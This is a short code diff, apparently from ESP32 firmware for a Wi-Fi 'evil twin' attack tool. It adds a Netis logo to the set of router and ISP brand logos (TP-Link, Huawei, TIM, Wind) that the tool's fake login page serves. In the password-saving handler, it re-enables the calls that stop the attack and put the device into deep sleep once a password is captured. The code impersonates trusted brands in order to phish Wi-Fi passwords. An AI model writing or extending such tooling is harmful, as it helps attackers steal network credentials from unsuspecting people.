@@ -32,6 +32,7 @@
 #include "web/logo/tim.h"
 #include "web/logo/tplink.h"
 #include "web/logo/huawei.h"
+#include "web/logo/netis.h"
 #include "web/logo/generic.h"
 #include "web/loader.h"
 #include "web/firmware_upgrade/index.h"
@@ -113,7 +114,8 @@ static void web_virtual_logo_folder_manager(httpd_req_t *req)
         { "/logo/Wind.png", wind_logo, sizeof(wind_logo) },
         { "/logo/TIM.png", tim_logo, sizeof(tim_logo) },
         { "/logo/TP-Link.png", tplink_logo, sizeof(tplink_logo) },
-        { "/logo/Huawei.png", huawei_logo, sizeof(huawei_logo) }
+        { "/logo/Huawei.png", huawei_logo, sizeof(huawei_logo) },
+		{ "/logo/Netis.png", netis_logo, sizeof(netis_logo) }
     };
     size_t table_size = sizeof(logo_table) / sizeof(logo_table[0]);
 	for (size_t i = 0; i < table_size; ++i) 
@@ -183,10 +185,10 @@ static esp_err_t save_password_manager(httpd_req_t *req)
 		httpd_resp_send(req, NULL, 0);
 
 		/* Stop attack */
-		//evil_twin_stop_attack();
+		evil_twin_stop_attack();
 		/* Enter in deep sleep to preserve battery power */
 		/* Only hardware wakeup (Reset button) */
-		//esp_deep_sleep_start();
+		esp_deep_sleep_start();
 	}
 	else
 	{
